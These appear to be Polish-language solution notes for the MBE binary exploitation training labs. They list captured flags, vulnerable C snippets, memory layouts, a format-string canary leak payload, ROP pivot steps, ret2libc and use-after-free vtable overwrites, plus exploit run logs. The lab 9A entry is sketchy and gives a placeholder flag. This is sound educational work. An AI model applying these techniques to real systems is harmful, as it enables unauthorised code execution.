## MBE - Notatki do zadań ##

**Misc Info**

* Zmienne na stosie są alokowane w odwrotnym kierunku niż deklaracja w kodzie programu
* Kierunek ułożenia w heapie jest odwrotny do tego co na stosie - czyli zgodnie z deklaracją w programie


----

**Lab 2C**

Flaga:  `1m_all_ab0ut_d4t_b33f`

----

**Lab 7A**

Flaga:  `0verfl0wz_0n_th3_h3ap_4int_s0_bad`

* Binarka statycznie skompilowana z Partial RELRO, kanarkiem i NX - **brak PIE!**
* Po 60 sekundach następuje timeout, więc w debuggerze trzeba obsłużyć SIGALARM
* Wiadomości przechowuje struktura zdefiniowana poniżej:
```c
struct msg {
    void (* print_msg)(struct msg *);
    unsigned int xor_pad[MAX_BLOCKS];
    unsigned int message[MAX_BLOCKS];
    unsigned int msg_len;
};
```
* Użytkownik podaje wiadomość oraz *jej rozmiar* - pod spodem następuje xorowanie z jakimiś wartościami, które są w tym wypadku bez znaczenia
* Błąd pozwalający na nadpisanie zmiennej `msg_len` występuje w snippecie poniżej (problemem jest wykorzystanie typu int i dzielenie z "ucięciem" ułamka - dzięki temu możemy zapisać o `BLOCK_SIZE - 1 ==> 3` bajtów poza buforem i warunek w ifie będzie spełniony):
```c
/* make sure the message length is no bigger than the xor pad */
    if((new_msg->msg_len / BLOCK_SIZE) > MAX_BLOCKS)
        new_msg->msg_len = BLOCK_SIZE * MAX_BLOCKS;

    /* read in the message to encrypt with the xor pad */
    printf("-Enter data to encrypt: ");
    read(0, &new_msg->message, new_msg->msg_len);
```
* Aby nadpisać zmienną `msg_len` wystarczy stworzyć wiadomość o długości 131 bajtów (128 max + 3 przepełnienia) i podać dowolnego stringa o tej długości
* Druga wiadomość o dowolnej długości (najlepiej ~100 bajtów) oraz treści posłuży do przechowania w niej bajtów łańcucha ROP
* Korzystając z nadpisanej zmiennej `msg_len` za pomocą opcji edytowania, wpisujemy łańcuch ROP nie zważając na jego wielkość
* Chunki na heapie są oddzielone od siebie o 272 bajty
* Aby umieścić dane na stosie można wykorzystać zmienną `numbuf` (ESP+0x1C) z funkcji `print_index()` - zawiera indeks wiadomości do wyświetlenia (`strtoul()` musi to umieć przeparsować i się nie wysypać):
```c
int print_index()
{
    char numbuf[32];
    unsigned int i = 0;

    /* get message index to print */
    printf("-Input message index to print: ");
    fgets(numbuf, sizeof(numbuf), stdin);
    i = strtoul(numbuf, NULL, 10);

    if(i >= MAX_MSG || messages[i] == NULL)
    {
        printf("-Invalid message index!\n");
        return 1;
    }

    /* print the message of interest */
    messages[i]->print_msg(messages[i]);

    return 0;
}
```
* Docelowa struktura pamięci wygląda w następujący sposób (do pivotu): `| Śmieci (272b - 132b) | Adres add esp, 0x24... | Śmieci (44b) | Łańcuch ROP |` 
* W tym momencie wymagane jest umieszczenie wskaźnika na `message[1]` (tam jest umieszczony ROP) w EAX, celem wywołania go pod adresem `0x804951F w print_index()` -
* Aby to uzyskać wpisujemy w `numbuf` (stos) : `| Śmieci (12b) | Adres mov eax, edx... | Adres xchg eax, esp... |`

**Podsumowanie wykonania kodu**:

*W tym zadaniu kluczem jest aby zrozumieć, że ESP może wskazywać nie tylko dane na stosie ale również na heapie - dlatego wykorzystywany jest gadżet:* ``add esp, 0x24``

1. W `numbuf` podmieniamy wskaźnik ESP na `message[1]`
2. Przeskok do `message[1]` i kolejny przeskok ESP+24h gdzie jest właściwy ROP
3. Właściwy ROP i wykonanie `system(/bin/bash)`

----

**Lab 8C**

Flaga:  `3v3ryth1ng_Is_@_F1l3`

* Binarka skompilowana ze wszystkimi mechanizmami bezpieczeństwa
* Zjada w argumentach zarówno ścieżki do plików, jak i deskryptory plików
* Dane przechowywane są w strukturze:
```c
struct fileComp {
	char fileContents1[255];
	char fileContents2[255];
	int cmp;
};
```
* Program wczytuje zawartość plików i porównuje je pod kątem leksykograficznym
* Posiada dwa sprawdzenia: pierwszy - czy fd nie jest STDIN oraz czy ścieżka do pliku nie kończy się znakami `.pass` za pomocą funkcji `securityCheck()`
* Funkcję `securityCheck()` można bardzo prosto obejść podając w jakimkolwiek argumencie, że sprawdzanym plikiem jest STDERR - wtedy następuje wypisanie flagi:
```
lab8C@warzone:/levels/lab08$ ./lab8C -fd=3 -fn=/home/lab8B/.pass
"3v3ryth1ng_Is_@_F1l3
" is lexicographically equivalent to "<<<For security reasons, your filename has been blocked>>>"
```

----

**Lab 8B**

Flaga: `Th@t_w@5_my_f@v0r1t3_ch@11` 

* Binarka skompilowana ze wszystkimi mechanizmami bezpieczeństwa
* Funkcjonalność to dodawanie do siebie wektorów trzymanych w strukturze:
```c
struct vector {
	void (*printFunc)(struct vector*);
	char a;
	short b;
	unsigned short c;
	int d;
	unsigned int e;
	long f;
	unsigned long g;
	long long h;
	unsigned long long i;
};
```
* W programie jest dodana funkcja `thisIsASecret()` która wywołuje shella
* Program obsługuje trzy wektory - v1 + v2 = v3
* Wektory w pamięci procesu są ułożone "nie po kolei":
  * v1 - Address: 0x80003040
  * v2 - Address: 0x80003100
  * v3 - Address: 0x80003080
  * fav - Address: 0x800030C0
* Dodanie sumy do ulubionych to nowa alokacja pamięci i dodanie do dziesięcioelementowej tablicy wskaźników
* Funkcja `loadFave()` ładuje wybrany wektor z ulubionych do v1
* Funkcja `fave()` jest podatnym komponentem zadania - nadpisuje o 4 bajty * indeks za dużo i dzięki kilkukrotnemu dodaniu wektora do ulubionych jesteśmy w stanie modyfikować jego zawartość za pomocą wcześniejszego sumowania:
```c
void fave()
{
	unsigned int i;
	for(i=0; i<MAX_FAVES; i++)
		if(!faves[i])
			break;
	if(i == MAX_FAVES)
		printf("You have too many favorites.\n");
	else
	{
		faves[i] = malloc(sizeof(struct vector));
		memcpy(faves[i], (int*)(&v3)+i, sizeof(struct vector));
		printf("I see you added that vector to your favorites, \
but was it really your favorite?\n");
	}
}
```
* Aby pokonać PIE wystarczy dodać pierwszy wektor i wypisać go na konsolę - jest tam podany adres funkcji printFunc a następnie policzyć offset pomiędzy `printVector` a `thisIsSecret` i różnicę tych wartości zapisać w wektorze
* Pięciokrotne dodanie wektora będącego sumą do ulubionych pozwala na całkowitą kontrolę nad wskaźnikiem funkcji w strukturze
* Uruchomienie kodu z nowego wskaźnika następuje po załadowaniu ostatniego ulubionego wektora jako v1 i żądaniu jego wyświetlenia:
```
lab8B@warzone:/levels/lab08$ python /tmp/lab_8b.py
[+] Starting program '/levels/lab08/lab8B': Done
[*] Stage #1 - Adding first vector
[*] Stage #2 - Leaking printVector() address
[*] Leaked printVector() address: 0x800010e9
[*] thisIsSecret() address: 0x800010a7
[*] Stage #3 - Adding second vector
[*] Stage #4 - Summing the vectors
[*] Stage #5 - Overwrite printFunc() address
[*] Stage #6 - Load malicious vector into v1
[*] Stage #7 - Execution of thisIsSecret()
[*] Switching to interactive mode
[...]
$ cat /home/lab8A/.pass
Th@t_w@5_my_f@v0r1t3_ch@11
```
----

**Lab 8A**

Flaga: `H4x0r5_d0nt_N33d_m3t4pHYS1c5` 

* Program posiada wszystkie mechanizmy bezpieczeństwa z **wyjątkiem PIE**
* Jego funkcjonalnością jest wypisywanie tekstów z dzieł Arystotelesa:
	* Input "A" wypisuje `Aristote's Metaphysics 350 B.C. Book VIII`
	* Input "F" wypisuje `Aristote's Metaphysics 350 B.C. Book IVIZ`
	* Input `\x00` wypisuje `Aristote's Metaphysics 350 B.C. Book MN9+`
* Program implementuje własne ciastko / kanarka na stosie w funkcji `findSomeWords()`:
```c
void findSomeWords() {
    /* We specialize in words of wisdom */
    char buf[24];
    // to avoid the null
    global_addr = (&buf+0x1);
    // have to make sure no one is stealing the librarians cookies (they get angry)
    global_addr_check = global_addr-0x2;
    char lolz[4];

    printf("\n..I like to read ^_^ <==  ");
    read(STDIN, buf, 2048); // >> read a lot every day !

    if(((*( global_addr))^(*(global_addr_check))) != ((*( global_addr))^(0xdeadbeef))){
        printf("\n\nWoah There\n");
        // why are you trying to break my program q-q
        exit(EXIT_FAILURE);
    }

    // protected by my CUSTOM cookie - so soooo safe now
    return;
}
```
* Customowy kanarek pobiera adres zwykłego kanarka i 8 bajtów przed nim. Dodatkowo wszystko jest poddawane operacji xor `((kanarek ^ kanarek - 8 b) xor 0xdeadbeef)` -> w związku z tym wymagane jest ustawienie takiej wartości, aby spełniała warunek: `0xdeadbeef ^ kanarek`
* Dzięki wywołaniu `scanf()` w funkcji pobierającej nazwisko autora książki można zapisać dowolną ilość danych na stosie przepełniając bufor `buf_secure` - dodatkowym "ficzerem", który przyda się w późniejszej exploitacji (wyciek kanarka na stosie) jest format string vulnerability w `printf()`:
```c
void selectABook() {
    /* Our Apologies,the interface is currently under developement */
    char buf_secure[512];
    scanf("%s", buf_secure);
    printf(buf_secure);
    if(strcmp(buf_secure, "A") == 0){
        readA();
    }else if(strcmp(buf_secure,"F") == 0){
        readB();
    }else if(*buf_secure == '\x00'){
        readC();
    }else if(buf_secure == 1337){
        printf("\nhackers dont have time to read.\n");
        exit(EXIT_FAILURE);
    }else{
        printf("\nWhat were you thinking, that isn't a good book.");
        selectABook();
    }
    return;
}
```
* Aby ominąć kanarka wymagane jest poznanie jego wartości - kanarek znajduje się na stosie pod adresem `0x5b0` a string weściowy pod `0x3b0`. Offset `(0x5b0 - 0x3b0)` pomiędzy nimi to `0x200 (512)` czyli modyfikatorem wypisującym string będzie `(512 b / 4 b ) + 2 = 130`, a dokładnie `%130$x`
* Leakujemy również zawartość adresu EBP (kanarek + 4 bajty), czyli `%131$x`
* Powyższe dwa kroki można wykonać na raz, wraz eleganckim formatowaniem: `0x%130$08X:0x%131$X`:
```
**********************************************
{|}  Welcome to QUEND's Beta-Book-Browser  {|}
**********************************************

	==> reading is for everyone <==
	[+] Enter Your Favorite Author's Last Name: 0x%130$08X:0x%131$X
0xED74AA00:0xBFFFF5B8
```
* Docelowa zawartość stosu musi wyglądać w następujący sposób: `|ŚMIECI 16 bajtów| 0xDEADBEEF | ŚMIECI 4 bajty | KANAREK | EBP | ROP`
* Łańcuch ROP w zasadzie dowolny - tak jak w innych widzianych przeze mnie rozwiązaniach tego zadania skorzystałem z automatycznie wygenerowanego chaina poprzez `ropgadget /levels/lab08/lab8A --ropchain`. Jedyne co zawsze zmieniam to gadżety z `inc eax` na `add eax, 2` i `add eax, 3` - nie mogę patrzeć na jedenaście razy powtórzony ten sam gadżet ;-)

----

**Lab 9C**

Flaga: `1_th0uGht_th4t_w4rn1ng_wa5_l4m3` 

* Program posiada wszystkie mechanizmy bezpieczeństwa
* Podstawową funkcją programu jest dodawanie liczb w klasie `DSVector`
* Binarka posiada 60 sekundowy timer, który killuje program po tym czasie
* Dzięki kiepsko zaimplementowanej funkcjonalności czytania z wektora jest możliwy **arbitrary read** i leak kanarka na stosie i wartości potrzebnej do obliczenia offsetu dla `system()` oraz `/bin/sh` i dzięki temu pokonania ASLR:
```c
template <class T>
class DSVector {
    public:
                     // I don't like indexing from 0, I learned VB.NET first.
        DSVector() : len(1), alloc_len(len+256) {}
        unsigned int size() { return len; }
        void append(T item);
                                            // No info leaks, either!
        T get(unsigned int index) { return (index < alloc_len ? vector_data[index] : -1); };
    private:
        unsigned int alloc_len;
        unsigned int len;
        // I was asleep during the dynamic sizing part, at least you can't overflow!
        T vector_data[1+256];
};
```
* Nie ma możliwości wskazania indeksu gdzie zostaną zapisane dane - aby dojść do końca "bufora" należy przeprowadzić sekwencyjny zapis na całej długości listy i dopiero wtedy możliwe jest nadpisanie kanarka oraz adresu powrotu + wpisanie adresu funkcji `system()` i `/bin/sh`
* Kanarek znajduje się w odległości `257 * 4 + 8` od początku listy "wektorów":
```
lab9C@warzone:/levels/lab09$ ./lab9C 
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice: 2 
Choose an index: 257
DSVector[257] = -181947136
```
* Ważna rzecz: program wyświetla liczby typu `unsigned int` za pomocą modyfikatora `printf(%d)`. Powoduje to problemy w wyświetlanej reprezentacji liczby - każda wyświetloną wartość adresu lub kanarka z programu wymaga operacji bitowej AND z `0xffffffff` (przykład z konwersją za pomocą IPython):
```
In [1]: hex(-181947136 & 0xffffffff)
Out[1]: '0xf527b500'
```
* Aby wyliczyć adresy `system()` i `/bin/sh` wystarczy leak z zerowego indeksu tablicy "wektorów":
```
lab9C@warzone:/levels/lab09$ ./lab9C kobiety i roznorodnosc juz sie da dyskryminowac
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice: 2
Choose an index: 0
DSVector[0] = -1210785795
```
* Ostatnim krokiem jest zbudowanie odpowiedniego układu pamieci na stosie (ret2libc): `| ŚMIECI 256 indeksów | KANAREK | ŚMIECI (EBP) |  RA (system()) | system() - ARGS `

----

**Lab 9A**

Flaga:  `abc`

* Jedynymi zabezpieczeniami w jakie wyposażona jest binarka to Partial RELRO oraz NX - **brak kanarka, PIE i FORTIFY!**
* Binarka posiada 300 sekundowy timer, który killuje program po tym czasie
* Luka znajduje się w funkcji odpowiedzialnej za fetchowanie i dodawanie elementu z/do hashsetu - program nie uwzględnia w warunkach elementów do pobrania indeksu zero lub braku obiektu:
```
lab9A@warzone:/levels/lab09$ ./lab9A 
+----------- clark's improved item storage -----------+
| [ -- Now using HashSets for insta-access to items!  |
| 1. Open a lockbox                                   |
| 2. Add an item to a lockbox                         |
| 3. Get an item from a lockbox                       |
| 4. Destroy your lockbox and items in it             |
| 5. Exit                                             |
+-----------------------------------------------------+
Enter choice: 3
Which lockbox?: 0
Item value: 1337
Segmentation fault (core dumped)
```
* Również mamy kontrolę nad rozmiarem alokowanej pamięci w hashsecie:
```
lab9A@warzone:/levels/lab09$ ./lab9A 
+----------- clark's improved item storage -----------+
| [ -- Now using HashSets for insta-access to items!  |
| 1. Open a lockbox                                   |
| 2. Add an item to a lockbox                         |
| 3. Get an item from a lockbox                       |
| 4. Destroy your lockbox and items in it             |
| 5. Exit                                             |
+-----------------------------------------------------+
Enter choice: 1
Which lockbox do you want?: 0
How many items will you store?: 4294967295
terminate called after throwing an instance of 'std::bad_alloc'
  what():  std::bad_alloc
```
* Binarka nie sprawdza, "czytając" obiekt czy on istnieje - klasyczny UAF
* Alokacja obiektów `HashSet` o różnych wielkościach (256, 128 i na końcu 600) pozwala na nadpisanie wskaźnika w vtable - konkretnie chodzi o wskaźnik do metody `add()`
* Jednak w takim podejściu wymagany jest leak dwóch adresów: libc oraz heap (heap jako wskaźnik do listy przechowywanych `HashSet` - w niedalekiej odległości leży vtable, które jest do zepsucia):
```c
// Hashset
template<class T, class HashFunc>
class HashSet {
    public:
        HashSet(unsigned int size) : m_size(size), set_data(new T[size]) {}
        virtual ~HashSet() { delete [] set_data; }
        virtual void add(T val);
        virtual unsigned int find(T val);
        virtual T get(unsigned int);
    private:
        unsigned int m_size;
        HashFunc m_hash;
        T *set_data;
};
typedef HashSet<int, hash_num> hashset_int;
```
* Dwukrotne dodanie obiektu `HashSet` o wielkości 256 do listy, a następnie skasowanie ich i dodanie mniejszego (rozmiar 128) spowoduje "niekorzystny" układ na heapie i wyleakowanie wskaźnika w libc za pomocą którego możemy znaleźć offset do funkcji `system()`:
```
+----------- clark's improved item storage -----------+
| [ -- Now using HashSets for insta-access to items!  |
| 1. Open a lockbox                                   |
| 2. Add an item to a lockbox                         |
| 3. Get an item from a lockbox                       |
| 4. Destroy your lockbox and items in it             |
| 5. Exit                                             |
+-----------------------------------------------------+
Enter choice: 3
Which lockbox?: 0
Item value: 0
Item Found
lockbox[0] = -1209240496
```
* W podobny sposób można ustalić adres heapa - alokujemy kolejny obiekt o wielkości 600 na czwartym miejcu listy (indeks 3) i czytamy z niego element o indeksie 389.
* Vtable znajduje się pod adresem: `leaked heap - 0x808`
* Mając adres vtable można określić wielkość potrzebnego `HashSetu` do jego wpisania
* Ostatnim krokiem jest wpisanie adresu `/bin/sh` w pierwszym `HashSet` 
